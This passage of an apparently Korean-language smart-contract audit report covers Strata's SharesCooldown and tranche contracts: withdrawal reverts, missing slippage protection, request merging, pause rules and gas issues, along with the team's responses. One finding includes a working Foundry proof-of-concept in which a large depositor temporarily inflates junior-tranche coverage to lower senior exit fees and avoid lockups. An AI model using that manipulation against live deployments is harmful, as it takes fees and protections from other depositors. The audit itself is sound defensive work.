**권장 완화 조치:** `validateRedemtionParams`는 하나라도 파라미터가 다르면 `return`이 아니라 `revert`해야 합니다. 반대로 함수 끝의 revert는 return으로 바뀌어야 합니다.

**Strata:** 커밋 **652a5c1**에서 수정됨.


### Allowance 기반 출금이 cooldown request slot 한도 때문에 revert될 수 있음

**설명:** tranche의 withdraw/redeem 로직은 allowance를 통해 제3자가 사용자 대신 출금하는 것을 허용합니다.
```solidity
if (caller != owner) {
    _spendAllowance(owner, caller, sharesGross);
}
```
이런 출금이 `SharesLock` exit mode로 실행되면, shares는 cooldown 시스템으로 옮겨지고 `requestRedeem`를 통해 redeem 요청이 생성됩니다.

`requestRedeem` 내부에서는 외부 receiver에 대해 cooldown 요청 수를 제한합니다.
```solidity
if (initialFrom != to && requestsCount >= PUBLIC_REQUEST_SLOTS_CAP) {
    revert ExternalReceiverRequestLimitReached(...);
}
```
이 조건은 `initialFrom != to`인 모든 경우를 외부 receiver로 취급하며, 신뢰된 제3자가 allowance를 통해 출금하면서 `to = caller`로 설정하는 시나리오도 포함합니다. 그 결과, 정상적인 allowance 기반 `withdrawal`도 예상치 못하게 public request slot cap에 걸려 revert될 수 있습니다.

이 동작은 직관적이지 않고 allowance 체크 단계에서 드러나지도 않기 때문에, 통합자와 사용자는 위임 출금에 이런 제약이 숨어 있다는 사실을 쉽게 예측하지 못합니다.

**영향:** SharesLock를 사용하는 allowance 기반 출금은 cooldown request slot 한도 때문에 예기치 않게 revert될 수 있어, 통합 및 delegated workflow를 깨뜨립니다.

**권장 완화 조치:** cooldown request 검증에서 allowance 기반 출금을 명시적으로 고려하거나, 이 제한과 위임 출금에 미치는 영향을 명확히 문서화하십시오.

**Strata:** 커밋 [6a9d7a7](https://github.com/Strata-Money/contracts-tranches/commit/6a9d7a7ace616a115a62245b463f6abf89d1ca5f)에서 수정됨.

**Cyfrin:** 확인함. 이제 `receiver`가 `caller` 또는 `owner`인 경우 `initialFrom`이 `receiver`로 설정되어, 해당 출금 요청은 `Private Request`로 처리되며 `Public Limit Cap`에 포함되지 않습니다.


### `finalizeWithFee`에는 race condition 보호가 없음

**설명:** `finalizeWithFee`는 결과 수수료나 청구 수량에 대한 사용자 지정 한도를 제공하지 않으므로, 제출과 실행 사이의 상태 변화에 결과가 민감합니다. 예를 들어:
- 새 요청이 merge되는 경우(특히 70번째 slot에 도달할 때)
- `vaultEarlyExitFeePerDay`가 갱신되는 경우
- 실행이 날짜 경계를 넘어 `daysLeft`가 증가하는 경우

또한 `cancel/finalize`에 따른 요청 재정렬 때문에 어떤 request index가 finalize되는지가 바뀌면서 예상 밖 revert가 날 수도 있습니다. 그 결과 사용자는 트랜잭션에 서명할 시점에 조기 finalization 비용을 신뢰성 있게 예측하거나 상한을 걸 수 없습니다.

**권장 완화 조치:** 사용자가 `finalizeWithFee` 호출 시 명시적인 한도(예: `maxFee`)를 입력하고, 그 한도를 위반하면 revert하도록 하십시오. 이렇게 하면 fee 변화, 타이밍 효과, request mutation에 대한 슬리피지형 보호를 제공할 수 있습니다.

**Strata:** 커밋 [092a08b](https://github.com/Strata-Money/contracts-tranches/commit/092a08b9fd0b79f3f7fa2461cb277113db121c8d)에서 수정됨.

**Cyfrin:** 확인함. 이제 사용자는 `finalizeWithFee` 호출 시 슬리피지 보호값을 넣을 수 있습니다. 이 보호는 선택사항이므로, 사용자는 지정하지 않고 실행 시점 계산값을 그대로 수용할 수도 있습니다.

\clearpage
## 정보성 (Informational)


### `SharesCooldown`는 여러 redemption 요청을 합쳐, cancel과 조기 종료에서 분할 불가능하게 만듦

**설명:** `SharesCooldown`는 다음 경우 여러 redemption 요청을 하나의 request entry로 합칩니다.

1. 사용자가 `MAX_ACTIVE_REQUEST_SLOTS`를 초과하는 경우

2. 두 요청(직전 요청과 현재 요청)의 `unlockAt`이 같은 경우(예: 같은 블록에서 생성됨)

```solidity
if (requestsCount < MAX_ACTIVE_REQUEST_SLOTS) {
            if (
                requestsCount > 0 &&
                requests[requestsCount - 1].unlockAt == unlockAt
            ) {
                // is requested within current block
                TRequest storage last = requests[requestsCount - 1];
                last.shares += uint192(shares);
            } else {
                requests.push(TRequest(unlockAt, uint192(shares)));
            }
        } else {
            TRequest storage last = requests[requestsCount - 1];
            last.shares += uint192(shares);
            if (last.unlockAt < unlockAt) {
                last.unlockAt = unlockAt;
            }
        }
```

한 번 합쳐지면 이 요청들은 분할이 불가능해집니다. `cancel()`과 `finalizeWithFee()`는 전체 request entry 단위로만 동작하므로, 사용자는 원래 제출했던 여러 출금 중 일부만 선택적으로 취소하거나 조기 종료할 수 없습니다. 합쳐진 모든 shares를 함께 처리해야 합니다.

이 merge 로직은 `ERC20Cooldown / UnstakeCooldown`에서 가져온 것이지만, `SharesCooldown`은 `cancel()`과 `finalizeWithFee()`를 추가로 도입했기 때문에 요청 단위의 세분성이 훨씬 더 중요합니다.

예시:

1. 사용자가 100 shares에 대한 redemption을 제출합니다(cooldown 7일).

2. 나중에 같은 unlock time을 갖는 10 shares redemption을 다시 제출합니다(또는 slot cap에 도달한 뒤 제출).

3. 두 요청은 110 shares짜리 하나의 request로 합쳐집니다.

4. 사용자는 이 중 10 shares만 따로 취소하거나 조기 종료할 수 없고, `cancel()`이나 `finalizeWithFee()`는 110 shares 전체에 대해서만 동작합니다.

**권장 완화 조치:** merge된 요청은 cancel과 finalizeWithFee에서 분할이 불가능하다는 점을 문서화하거나, merge를 피하고 redemption 호출당 request를 하나씩 유지하십시오.

**Strata:** 인지함.


### `SharesCooldown`는 명세에 정의된 pause lockup 규칙을 강제하지 않음

**설명:** 명세(SIP-01 §7)는 redemption이 pause되었을 때 다음을 요구합니다.

- finalization은 revert해야 함

- 잠긴 shares는 Silo에 계속 보관되어야 함

하지만 `cancel()`은 전역 pause 중에도 사용자가 shares를 다시 가져갈 수 있게 하여 이 규칙을 우회시킵니다.

```solidity
    function cancel(IERC20 vault, address user, uint256 i) external onlyUser(user) {

        TRequest[] storage requests = activeRequests[address(vault)][user];
        uint256 len = requests.length;
        require(i < len, "OutOfRange");
        TRequest memory req = requests[i];
        if (i < len - 1) {
            requests[i] = requests[len - 1];
        }
        requests.pop();
        vault.transfer(user, req.shares); // @note берет ли cancel комиссии?
        emit RequestCanceled(address(vault), user, req.shares);
    }
```

**개선 방향:**
취소는 항상 허용되고, pause가 shares를 완전히 잠그는 것은 아니라는 점이 드러나도록 명세를 수정하십시오.

**Strata:** SIP가 [69f3eb58](https://github.com/Strata-Money/contracts-tranches/commit/69f3eb58696c44bd9e2c9890ec9023ebc9d1722e)에서 업데이트됨

**Cyfrin:** 확인함.


### `SharesCooldown::requestRedeem`의 도달 불가능한 코드

**설명:** `SharesCooldown::requestRedeem`에는 `cooldownSeconds == 0`(즉시 redemption)인 경우를 처리하는 분기가 있지만, 이 함수는 실제로는 `cooldownSeconds > 0`일 때만 호출됩니다.
- `StrataCDO::calculateExitMode`는 `exit.sharesLock > 0`일 때만 `exitMode`를 `SharesLock`으로 설정하고, `Tranche::_withdraw`는 `exitMode == sharesLock`일 때만 `CDO::cooldownShares`를 호출합니다.
```solidity
    function calculateExitMode (address tranche, address owner) external view returns (TExitMode mode, uint256 fee, uint32 cooldownSeconds) {
        if (address(sharesCooldown) != address(0)) {
            ...
            if (exit.sharesLock > 0) {
//@audit => exitMode is set as SharesLock only when a cooldown will be applied
@>              return (TExitMode.SharesLock, fee, exit.sharesLock);
            }
        }
        ...
    }

    function _withdraw(
        ...
    ) internal virtual {
        ...

//@audit => CDO.cooldownshares gets called only when exitMode is set as SharesLock
        if (exitMode == IStrataCDO.TExitMode.SharesLock) {
            ...
            cdo.cooldownShares(address(this), sharesGross, owner, receiver, exitFee, cooldownSec);
            return;
        }

        ...
        cdo.withdraw(address(this), token, tokenAssets, baseAssets, owner, receiver);
        ...
    }

```

**권장 완화 조치:** [cooldown이 없을 때는 `CooldownShares.requestRedeem`가 호출되지 않으므로](https://github.com/Strata-Money/contracts-tranches/blob/219880e7a6d43a88d91b1ff3c1f94cea1082bbc9/contracts/tranches/base/cooldown/SharesCooldown.sol#L60-L64), `cooldownSeconds == 0` 케이스를 제거하는 것을 고려하십시오.

**Strata:** 인지함. 현재 흐름에서는 해당 검사와 instant redemption 경로가 실제로 도달 불가능한 것이 맞지만, ERC20Cooldown과의 일관성과 향후 다른 전략 흐름이 추가될 가능성을 고려해 유지하겠다는 입장입니다.


### `SharesCooldown::finalize`의 `at` 파라미터는 기능적으로 중복됨

**설명:** `finalize` 함수들은 특정 타임스탬프 시점 기준으로 claim을 finalize할 수 있는 것처럼 보이도록 `at` 파라미터를 노출합니다. 하지만 실제로는 이 값이 거의 아무 제어권도 주지 않습니다. 유일한 검사는 `at <= block.timestamp`뿐입니다.

```solidity
function extractClaimableInner(address vault, address user, uint256 at) internal returns (uint256 claimable) {
        if (at > block.timestamp) {
            revert InvalidTime();
        }
        ...

        uint256 len = requests.length;
        for (uint256 i; i < len; ) {
            ..
            if (isCooldownActive && req.unlockAt > at)
        }
        ...
    }
```

결과적으로 과거의 어떤 `at` 값을 넣어도 동작은 사실상 `block.timestamp`를 넣는 것과 동일하며, `at`을 이용해 특정 요청만 골라 finalize하거나 과거 시점의 finalization을 시뮬레이션하는 것도 불가능합니다.

**권장 완화 조치:** `at` 파라미터가 있는 `finalize` 함수들을 제거하십시오.

**Strata:** 인지함. 이 파라미터는 사용자가 완료된 요청 전부가 아니라 일부만 finalize할 수 있게 해 준다는 입장입니다.



### coverage 조작으로 고래가 항상 가장 유리한 출금 조건을 얻을 수 있음

**설명:** `SharesCooldown`의 출금 파라미터(fee와 sharesLock)는 `StrataCDO`의 현재 `coverage()` 값에 따라 선택됩니다. coverage는 unlock된 tranche TVL, 즉 `(jrtNav - lockedJrt) / (srtNav - lockedSrt)`로 계산되며, 출금 요청 시점의 값이 사용됩니다.

```solidity
    function totalAssetsUnlocked() public view returns (uint256 jrtNav, uint256 srtNav) {
        (jrtNav, srtNav, ) = accounting.totalAssetsT0(); // получаем весь TVL

        uint256 jrtNavLocked = jrtVault.convertToAssets(jrtVault.balanceOf(address(sharesCooldown)));
        uint256 srtNavLocked = srtVault.convertToAssets(srtVault.balanceOf(address(sharesCooldown)));

        jrtNav = jrtNav > jrtNavLocked ? jrtNav - jrtNavLocked : 0;
        srtNav = srtNav > srtNavLocked ? srtNav - srtNavLocked : 0;
        return (jrtNav, srtNav);
    }

    function coverage () public view returns (uint32 coverage) {
        (uint256 jrtNav, uint256 srtNav) = totalAssetsUnlocked();
        if (srtNav == 0) {
            return type(uint32).max;
        }
        uint256 coverage = jrtNav * 1e6 / srtNav; //
        return coverage > type(uint32).max ? type(uint32).max : uint32(coverage);
    }
```
coverage는 순간값이며 tranche TVL에 직접 의존하기 때문에, 대규모 예치자는 redemption 직전에 큰 JRT 예치를 넣어 `jrtNav`를 일시적으로 키우고 coverage를 더 유리한 구간으로 밀어 넣을 수 있습니다. 그 결과 더 낮은 fee / 더 짧은 cooldown(심지어 no lock)을 적용받은 뒤, SRT redemption을 마치고 임시로 넣었던 JRT 포지션을 되돌릴 수 있습니다. 특히 SRT 출금에서는:
1. 먼저 `jrtNav`를 키워 coverage를 유리하게 만들고,
2. 자신의 SRT 출금으로 `srtNav`를 줄이면서,
coverage를 계속 유리하게 유지한 채 임시 JRT 포지션도 빠져나올 수 있어 효과가 큽니다.

PoC는 기준 명세의 bounds를 이용해 이 동작을 보여줍니다.

1. 시작 상태: `jrtNav = 10,000`, `srtNav = 100,000` (coverage = 10%)로, 보통 SRT 출금은 더 불리한 구간(예: r1: 0.7% fee + 7h lock)에 들어갑니다.

2. 고래가 JRT에 `30,001`을 예치해 coverage를 약 40%로 올리고, SRT의 가장 유리한 구간(r2: 0.15% fee, no lock)에 도달합니다.

3. 고래는 즉시 SRT 40,000을 r2 조건으로 redeem합니다.

4. 이어서 임시 JRT 예치분도 redeem하고, 나중에 기초 UnstakeCooldown을 finalize합니다.

5. 로그를 보면, 이런 조작 없이 baseline 수수료를 냈을 때보다 훨씬 적은 비용만 내고(그리고 의도된 lockup도 피하면서) 빠져나옵니다.

원래라면 고래가 낼 수수료는 `40,000 * 0.7% = 280 USDE` 정도입니다.
하지만 실제로는 약 `137 USDe`만 내게 됩니다.

이 문제는 "가장 좋은 band"에만 국한되지 않습니다. coverage를 조금만 개선해도 fee를 유의미하게 줄이거나 대기 시간을 줄일 수 있습니다(예: "7일 → 1일", "0.7% → 0.15%"). 따라서 큰 자산을 가진 계정이라면 구조적으로 계속 악용 가능합니다. 특정 vault의 최상 band에 `sharesLock == 0`이 있다면, 저렴한 유동성이나 flash liquidity를 가진 누구나 coverage를 잠시 그 구간으로 밀어 넣고 즉시 빠져나올 수 있습니다.

**영향:** 고래는 coverage 기반 보호 장치를 우회해 SRT 출금에서 일시적으로 coverage를 부풀림으로써:

1. 의도된 것보다 체계적으로 더 낮은 출금 수수료를 냄

2. cooldown을 우회하거나 크게 줄일 수 있음(심지어 no lock도 가능)

**개념 증명 (Proof of Concept):** 이 파일을 `Poc/Cyfrin`에 붙여 넣으십시오.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { CDOTest } from "../../CDO.t.sol";
import { IStrataCDO } from "../../../contracts/tranches/interfaces/IStrataCDO.sol";
import { IUnstakeHandler } from "../../../contracts/tranches/interfaces/cooldown/IUnstakeHandler.sol";
import { ERC4626 } from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {console} from "forge-std/console.sol";
import {SharesCooldown} from "../../../contracts/tranches/base/cooldown/SharesCooldown.sol";
import {AccessControlled} from "../../../contracts/governance/AccessControlled.sol";
import {ISharesCooldown} from "../../../contracts/tranches/interfaces/cooldown/ISharesCooldown.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { CooldownBase } from "../../../contracts/tranches/base/cooldown/CooldownBase.sol";
import { UnstakeCooldown } from "../../../contracts/tranches/base/cooldown/UnstakeCooldown.sol";
import { ICooldown } from "../../../contracts/tranches/interfaces/cooldown/ICooldown.sol";


contract JrtSrtRatioViolationTest is CDOTest {

    function test_coverage_manipulation() public {
        address whale = address(0x1234);
        address owner = cdo.owner();
        vm.startPrank(owner);
        SharesCooldown sharesCooldown = SharesCooldown(
            address(
                new ERC1967Proxy(
                    address(new SharesCooldown()),
                    abi.encodeWithSelector(CooldownBase.initialize.selector, owner, address(acm))
                )
            )
        );
        AccessControlled(sharesCooldown).setTwoStepConfigManager(owner);
        acm.grantRole(keccak256("COOLDOWN_WORKER_ROLE"), address(cdo));
        // 2. Register sharesCooldown in CDO
        cdo.setSharesCooldown(ISharesCooldown(address(sharesCooldown)));


        // Set up real spec exit bands per reference
        SharesCooldown.TExitUpperBounds memory jrtExitBounds = ISharesCooldown.TExitUpperBounds({
            p0: 5000,     // 0.5% (in ppm)
            p1: 23000,    // 2.3% (in ppm)
            r0: ISharesCooldown.TExitParams({ feePpm: 10000, sharesLock: 2 days }),   // 1% fee + 2 days lock
            r1: ISharesCooldown.TExitParams({ feePpm: 5000, sharesLock: 8 hours }),   // 0.5% fee + 8h lock
            r2: ISharesCooldown.TExitParams({ feePpm: 300, sharesLock: 0 })           // 0.03% fee, no lock
        });
        SharesCooldown.TExitUpperBounds memory srtExitBounds = ISharesCooldown.TExitUpperBounds({
            p0: 20000,     // 2% (in ppm)
            p1: 400000,    // 40% (in ppm)
            r0: ISharesCooldown.TExitParams({ feePpm: 10000, sharesLock: 3 days }),   // 1% fee + 3 days lock
            r1: ISharesCooldown.TExitParams({ feePpm: 7000, sharesLock: 7 hours }),   // 0.7% fee + 7h lock
            r2: ISharesCooldown.TExitParams({ feePpm: 1500, sharesLock: 0 })          // 0.15% fee, no lock
        });
        sharesCooldown.setVaultExitBounds(address(jrtVault), jrtExitBounds);
        sharesCooldown.setVaultExitBounds(address(srtVault), srtExitBounds);

        // Scenario setup
        // Initial state:
        //   JRT unlocked = 10,000
        //   SRT unlocked = 100,000
        //   Coverage = 10%

        // Bootstrap the JRT/SRT pools to have JRT=10_000, SRT=100_000
        address bootstrapper = address(0xdeadbeef);
        USDe.mint(bootstrapper, 10000 ether);
        USDe.mint(bootstrapper, 60000 ether);
        vm.startPrank(bootstrapper);
        USDe.approve(address(jrtVault), 10000 ether);
        jrtVault.deposit(10000 ether, bootstrapper);
        USDe.approve(address(srtVault), 60000 ether);
        srtVault.deposit(60000 ether, bootstrapper);
        vm.stopPrank();

        USDe.mint(whale, 80001 ether);
        // Whale's initial SRT deposit for withdrawal
        vm.startPrank(whale);
        USDe.approve(address(srtVault), 40000 ether);
        srtVault.deposit(40000 ether, whale); // initially not deposited yet, to start at 100k (see below)
        vm.stopPrank();

        // Now SRT = 40,000 + 60,000 = 100,000
        //    JRT = 10,000

        // Whale wants to withdraw 30,000 SRT (would normally hit 0.7% fee + 7h lock)

        // Step 1: Whale makes a huge deposit into JRT to manipulate coverage
        vm.startPrank(whale);

        USDe.approve(address(jrtVault), 30001 ether);
        jrtVault.deposit(30001 ether, whale);

        // After this JRT = 10,000 + 30,001 = 40,001
        // SRT still 100,000

        // Coverage = 40,001 / 100,000 = 40.001% (triggers SRT fee/lock lowering to r2)

        // Step 2: Whale immediately withdraws 30,000 SRT at lowest fee, no cooldown
        // Step 2: Whale immediately redeems SRT to receive 30000 assets before fees (fee will apply on top)
        uint256 srtAssetsToReceive = 40000 ether;
        uint256 srtSharesToRedeem = srtVault.previewRedeem(srtAssetsToReceive);
        srtVault.redeem(srtSharesToRedeem, whale, whale);

        // Step 3: Whale redeems temporary JRT to receive 29991 assets before fees (fee will apply on top)
        uint256 jrtAssetsToReceive = 30001 ether;
        uint256 jrtSharesToRedeem = jrtVault.previewRedeem(jrtAssetsToReceive);
        jrtVault.redeem(jrtSharesToRedeem, whale, whale);


        uint256 whaleBalanceBefore = USDe.balanceOf(whale);
        vm.warp(block.timestamp + 7 days); // wait because SharesCooldown redeem automatically withdraw on USDe and we need to wait UnstakeCooldown period.
        unstakeCooldown.finalize(sUSDe, whale);
        uint256 whaleBalanceAfter = USDe.balanceOf(whale);
        uint256 whaleReceived = whaleBalanceAfter - whaleBalanceBefore;
        console.log("Received: ", whaleReceived);
        uint256 fee = 70001 * 1e18 - whaleReceived;
        console.log("Fee: ", fee); // Fee is ~137 USDe, while we will pay 280 USDe in normal scenario
        vm.stopPrank();

    }
}
```

**권장 완화 조치:** `SharesCooldown`의 `TExitUpperBounds`를 정의할 때 다음 두 가지를 고려하십시오.
- 서로 다른 coverage 구간을 왕복하는 비용이 중립화되도록 fee를 정의하십시오. 예를 들면 `jrt.r2.fee + srt.r2.fee ≥ srt.r1.fee` 같은 관계를 만족하게 하는 방식입니다.
- R2 band에도 최소한의 lock-up 기간을 두어, Junior Tranche에 대한 즉시 예치/출금으로 coverage를 조작하려는 유인을 줄이십시오.

이상적으로는 `TwoStepConfigManager::validateBounds`를 리팩터링해, coverage 구간별 fee와 sharesLock 범위, 그리고 각 범위 내 최소/최대값이 보다 명확히 드러나도록 해야 합니다.

**Strata:** 인지함. `coverage boundaries`는 반드시 보존해야 하는 엄격한 불변식은 아니라는 입장을 밝혔습니다.


### receiver 제한 때문에 sUSDe 출금이 막힐 수 있음

**설명:** 사용자에게 `sUSDe`를 전달하려는 finalization 경로는 receiver가 `FULL_RESTRICTION MODE`에 있으면 revert될 수 있습니다. [sUSDe token](https://etherscan.io/token/0x9d39a5de30e57443bff2a8307a4256c8797a3497#code)은 `_beforeTokenTransfer`를 통해 transfer 제한을 강제하며, `FULL_RESTRICTED_STAKER_ROLE`이 부여된 주소로부터 또는 그 주소로의 transfer를 막습니다. 그 결과 `SharesCooldown` 중 `sUSDe` 기반 finalization이 revert될 수 있습니다.
```solidity
/**
   * @dev Hook that is called before any transfer of tokens. This includes
   * minting and burning. Disables transfers from or to of addresses with the FULL_RESTRICTED_STAKER_ROLE role.
   */

  function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {
    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && to != address(0)) {
      revert OperationNotAllowed();
    }
    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {
      revert OperationNotAllowed();
    }
  }
```

현실적인 시나리오는 사용자가 `requestRedeem` 시점에는 제한 대상이 아니었지만 cooldown 기간 중 제한 대상이 되는 경우입니다. cooldown이 끝난 뒤 `sUSDe`로 finalize하려 하면 실패하고, 결과적으로 사용자는 추가 unstake cooldown을 감수하면서 `USDe` 경로로 finalize할 수밖에 없게 됩니다. 이는 원래 기대했던 출구 동작을 바꾸어 버립니다.

**권장 완화 조치:** 프로토콜은 finalization 시점에 `sUSDe` 제한 상태가 바뀔 수 있다는 점을 고려해야 합니다.

**Strata:** **Cyfrin:**


### coverage가 raw sharesCooldown 잔액에 의존해 grief 공격이 가능함

**설명:** `coverage()`는 `totalAssetsUnlocked()`에서 계산되며, 여기서는 `convertToAssets(vault.balanceOf(address(sharesCooldown)))`를 tranche NAV에서 빼는 방식을 사용합니다.

```solidity
    function totalAssetsUnlocked() public view returns (uint256 jrtNav, uint256 srtNav) {
        (jrtNav, srtNav, ) = accounting.totalAssetsT0();

        uint256 jrtNavLocked = jrtVault.convertToAssets(jrtVault.balanceOf(address(sharesCooldown)));
        uint256 srtNavLocked = srtVault.convertToAssets(srtVault.balanceOf(address(sharesCooldown)));

        jrtNav = jrtNav > jrtNavLocked ? jrtNav - jrtNavLocked : 0;
        srtNav = srtNav > srtNavLocked ? srtNav - srtNavLocked : 0;
        return (jrtNav, srtNav);
    }
```

즉 coverage는 `SharesCooldown`의 내부 `activeRequests`가 아니라, 그 주소가 들고 있는 raw ERC20 share balance에 의존합니다. 따라서 shares를 `SharesCooldown`으로 직접 전송하면, 회계 관점에서는 그 shares가 영구적으로 "잠긴" 것으로 간주되어 coverage를 영구히 왜곡할 수 있습니다.

**권장 완화 조치:** shares를 `SharesCooldown`으로 직접 전송하지 못하게 막아, 초과 잔액이 coverage에 영향을 주지 않도록 하십시오.

**Strata:** **Cyfrin:**


### `Tranche::maxWithdraw`는 `SharesCooldown` 컨트랙트의 최대 출금 가능량을 과소평가할 수 있음

**설명:** owner가 `SharesCooldown`일 때 CDO는 이를 exit fee / lockup에서 명시적으로 면제합니다.
```solidity
if (owner == address(sharesCooldown)) {
    return (TExitMode.ERC4626, 0, 0);
}
```

하지만 `Tranche.maxWithdraw(owner)`는 `previewRedeem(sharesGross)`를 사용해 `assetsNet`을 계산하는데, `previewRedeem`은 exit 조건 조회 시 owner를 `address(0)`으로 하드코딩합니다.

```solidity
function maxWithdraw(address owner) public view returns (uint256 assetsNet) {
    uint256 sharesGross = balanceOf(owner);
    assetsNet = Math.min(previewRedeem(sharesGross), cdo.maxWithdraw(address(this), owner));
}

function previewRedeem(uint256 sharesGross) public view returns (uint256 assetsNet) {
    (, uint256 fee,) = cdo.calculateExitMode(address(this), address(0));
    assetsNet = quoteRedeem(sharesGross, fee);
}
```

그 결과 `maxWithdraw(address(sharesCooldown))`는 실제 적용되지 않는 exit fee까지 포함해 계산될 수 있어, 최대 출금 가능량이 과소평가됩니다.

**권장 완화 조치:** `maxWithdraw(owner)`에서 `SharesCooldown`을 고려하십시오.

또는 `SharesCooldown`이 redemption 실행 경로(`Tranche::redeem`)에만 관여한다는 점을 감안해, `Tranche::maxWithdraw`와 `Tranche::previewRedeem`은 `SharesCooldown`의 fee 면제를 반영하지 않는다고 문서화하는 것도 방법입니다.

**Strata:** 커밋 [4b49a00](https://github.com/Strata-Money/contracts-tranches/commit/4b49a00c772df2dbf66e0c2982d50ab2633c0fe2)에서 수정됨.

**Cyfrin:** 확인함. 이제 `Tranche::maxWithdraw`와 `Tranche::previewRedeem`의 inline comment에 이 함수들이 public usage용임이 명시되어 있습니다.


### `onlyUser` modifier의 revert 메시지가 오해를 부름

**설명:** `onlyUser` modifier는 `msg.sender == user`로 접근을 제한하지만, revert 메시지는 "OnlyOwner"를 사용합니다. 제한되는 역할은 owner가 아니라 특정 user 주소이므로 이 메시지는 오해를 유발합니다.

**권장 완화 조치:** 강제되는 역할을 정확히 반영하도록 revert 메시지를 바꾸십시오(예: "OnlyUser" 또는 "Unauthorized").

**Strata:** 커밋 [b2ddea9](https://github.com/Strata-Money/contracts-tranches/commit/b2ddea94d22b1dc791ffada5d8afb32e8e2a579e)에서 수정됨.

**Cyfrin:** 확인함.


### `OnMetaWithdraw` 이벤트의 owner 필드가 오해를 부름

**설명:** `OnMetaWithdraw` 이벤트는 첫 번째 인자로 receiver를 emit하지만, 파라미터 이름은 owner로 되어 있습니다. owner, caller, receiver는 서로 다를 수 있으므로 이 의미 불일치는 오프체인 인덱서에 오해를 줄 수 있습니다.

**권장 완화 조치:** 이벤트 파라미터 이름을 receiver로 바꾸거나, owner와 receiver를 둘 다 명시적으로 포함하십시오.

**Strata:** 커밋 [1021020](https://github.com/Strata-Money/contracts-tranches/commit/1021020ab866177f8570aa28494f0f7a03a1b091)에서 수정됨.

**Cyfrin:** 확인함.

\clearpage
## 가스 최적화 (Gas Optimization)


### 수수료가 없을 때는 `CDO::accrueFee` 호출을 건너뛰기

**설명:** 출금/상환 중 `TExitMode != SharesLock`이면, 출금 시 지불해야 할 fee가 있을 수 있으므로 `CDO::accrueFees`가 호출됩니다. 하지만 `SharesCooldown`에서 출금을 finalize하는 경우처럼, 실제로 수수료가 없는 상황도 여럿 존재합니다.
```solidity
    function _withdraw(
        ...
    ) internal virtual {
       ...

        if (exitMode == IStrataCDO.TExitMode.SharesLock) {
            ...
        }

        uint256 baseAssetsGross = convertToAssets(sharesGross);
        uint256 fee = Math.saturatingSub(baseAssetsGross, baseAssets);

        _burn(owner, sharesGross);
//@audit => No need to call cdo.accrueFee when no fees will be charged
@>      cdo.accrueFee(address(this), fee);
        ...
    }

```


**권장 완화 조치:** 수수료가 부과되지 않는 시나리오에서는 `CDO::accrueFees`를 호출할 필요가 없습니다.

**Strata:** 커밋 [b690dcd](https://github.com/Strata-Money/contracts-tranches/commit/b690dcde46a41553ac5d44810367e7c222bc6082)에서 수정됨.

**Cyfrin:** 확인함.


### `SharesCooldown::finalizeWithFee`와 `SharesCooldown::cancel`의 `user` 파라미터는 중복됨

**설명:** `SharesCooldown::finalizeWithFee`와 `SharesCooldown::cancel` 함수는 `user` 파라미터가 반드시 `msg.sender`와 같아야 하도록 강제합니다. 다른 값이 들어오면 트랜잭션이 revert되므로, 이 파라미터는 사실상 중복이며 `msg.sender`를 직접 사용하면 됩니다.
```solidity
    modifier onlyUser (address user) {
@>      require(msg.sender == user, "OnlyOwner");
        _;
    }

function finalizeWithFee(ITranche vault, address user, uint256 i) external onlyUser(user) returns (uint256 claimed) {
        ...
}

function cancel(IERC20 vault, address user, uint256 i) external onlyUser(user) {
        ...
}


```

**권장 완화 조치:** `finalizeWithFee`와 `cancel`에서 `user` 파라미터를 제거하고, 대신 `msg.sender`를 직접 사용하십시오.

**Strata:** permissionless interface와의 일관성을 위해 유지하겠다고 인지함. 또한 향후 제3자가 사용자를 대신해 finalize할 수 있는 새로운 역할이 추가될 가능성도 고려한다고 밝혔습니다.

\clearpage
